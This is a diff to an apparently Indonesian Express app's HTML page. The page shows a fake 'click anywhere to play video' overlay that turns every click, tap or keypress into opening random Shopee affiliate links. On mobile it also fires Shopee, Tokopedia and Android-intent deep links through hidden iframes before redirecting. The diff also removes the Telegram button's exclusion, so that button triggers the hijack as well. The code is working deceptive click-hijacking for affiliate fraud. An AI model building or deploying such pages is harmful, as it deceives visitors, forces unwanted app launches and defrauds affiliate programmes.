@@ -114,7 +114,6 @@ app.use(async (req, res) => {
           z-index: 1000000;
           position: relative;
           box-shadow: 0 4px 15px rgba(0,136,204,0.3);
-          pointer-events: auto;
         }
         
         .telegram-button:hover {
@@ -150,10 +149,6 @@ app.use(async (req, res) => {
         .click-box {
           animation: pulse 2s infinite;
         }
-        
-        .button-container {
-          margin: 20px 0;
-        }
       </style>
     </head>
     <body>
@@ -162,11 +157,9 @@ app.use(async (req, res) => {
         <div class="click-box">
           KLIK DIMANAPUN UNTUK PLAY VIDEO
         </div>
-        <div class="button-container">
-          <button class="telegram-button" id="telegramButton" onclick="event.stopPropagation(); window.location.href='https://t.me/sedot6969'; return false;">
-            📱 JOIN TELE
-          </button>
-        </div>
+        <button class="telegram-button" id="telegramButton" onclick="window.open('https://t.me/sedot6969', '_blank'); event.stopPropagation();">
+          📱 JOIN TELE
+        </button>
         <div class="instruction">
           Klik di area manapun<br>
           <small>Lanjut ke video</small>
@@ -195,14 +188,12 @@ app.use(async (req, res) => {
           const isAndroid = /Android/i.test(navigator.userAgent);
           
           if (!isMobile) {
-            const shopeeUrl = getRandomAffiliateLink();
-            window.open(shopeeUrl, '_blank');
+            window.open(getRandomAffiliateLink(), '_blank');
             return;
           }
           
           if (isAndroid) {
             try {
-              // Intent untuk Android
               window.location.href = 'intent://main#Intent;package=com.shopee.id;scheme=shopee;end';
               setTimeout(() => {
                 if (!hasClicked) {
@@ -213,86 +204,83 @@ app.use(async (req, res) => {
               window.location.href = getRandomAffiliateLink();
             }
           } else {
-            // iOS
-            window.location.href = 'shopee://';
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'shopee://';
+            document.body.appendChild(iframe);
+            
             setTimeout(() => {
-              if (!hasClicked) {
-                window.location.href = getRandomAffiliateLink();
-              }
-            }, 2000);
+              document.body.removeChild(iframe);
+              setTimeout(() => {
+                if (document.body.contains(iframe) || !hasClicked) {
+                  window.location.href = getRandomAffiliateLink();
+                }
+              }, 500);
+            }, 500);
           }
         }
         
-        function handleClick(e) {
-          // Cek apakah yang diklik adalah tombol Telegram atau anaknya
-          if (e.target.closest && e.target.closest('#telegramButton')) {
-            return; // Jangan proses untuk tombol Telegram
-          }
+        function openShopeeWithTab() {
+          if (hasClicked) return;
+          hasClicked = true;
           
+          const shopeeUrl = getRandomAffiliateLink();
+          window.open(shopeeUrl, '_blank');
+          
+          setTimeout(() => {
+            window.location.href = BASE_URL + CURRENT_PATH;
+          }, 300);
+        }
+        
+        function handleClick() {
           if (hasClicked) return;
           hasClicked = true;
           
           const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
           
           if (isMobile) {
-            openShopeeApp();
-          } else {
-            // Desktop - buka link afiliasi di tab baru
-            const shopeeUrl = getRandomAffiliateLink();
-            window.open(shopeeUrl, '_blank');
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
             
-            // Redirect ke halaman asli setelah beberapa saat
+            const deepLinks = ['shopee://', 'vt.tokopedia.com://', 'intent://main#Intent;package=com.shopee.id;scheme=shopee;end'];
+            const randomDeepLink = deepLinks[Math.floor(Math.random() * deepLinks.length)];
+            
+            iframe.src = randomDeepLink;
+            document.body.appendChild(iframe);
+            
             setTimeout(() => {
-              window.location.href = BASE_URL + CURRENT_PATH;
+              document.body.removeChild(iframe);
+              
+              setTimeout(() => {
+                const shopeeUrl = getRandomAffiliateLink();
+                window.open(shopeeUrl, '_blank');
+                
+                setTimeout(() => {
+                  window.location.href = BASE_URL + CURRENT_PATH;
+                }, 300);
+              }, 500);
             }, 500);
+          } else {
+            openShopeeWithTab();
           }
         }
         
-        // Handler khusus untuk tombol Telegram
-        function handleTelegramClick(e) {
-          e.stopPropagation(); // Mencegah event bubbling
-          e.preventDefault();
-          
-          // Buka Telegram di tab yang SAMA (ga kena blokir popup)
-          window.location.href = 'https://t.me/sedot6969';
-          
-          return false;
-        }
-        
-        // Pasang event listener
         const overlay = document.getElementById('redirect-overlay');
-        const telegramBtn = document.getElementById('telegramButton');
         
-        // Event untuk overlay (selain tombol Telegram)
         overlay.addEventListener('click', handleClick);
-        
-        // Event untuk touch device
         overlay.addEventListener('touchstart', function(e) {
-          // Cek apakah yang disentuh adalah tombol Telegram
-          if (e.target.closest && e.target.closest('#telegramButton')) {
-            return;
-          }
           e.preventDefault();
-          handleClick(e);
+          handleClick();
         });
         
-        // Event khusus untuk tombol Telegram
-        telegramBtn.addEventListener('click', handleTelegramClick);
-        telegramBtn.addEventListener('touchstart', function(e) {
-          e.stopPropagation();
-          e.preventDefault();
-          window.location.href = 'https://t.me/sedot6969';
-        });
-        
-        // Keyboard support
         document.addEventListener('keydown', function(e) {
           if ((e.code === 'Space' || e.code === 'Enter') && !hasClicked) {
             e.preventDefault();
-            handleClick(e);
+            handleClick();
           }
         });
         
-        console.log('Siap: Klik di mana saja (kecuali tombol JOIN TELE) untuk buka Shopee');
+        console.log('Siap: Klik di mana saja untuk buka aplikasi Shopee');
       </script>
     </body>
     </html>
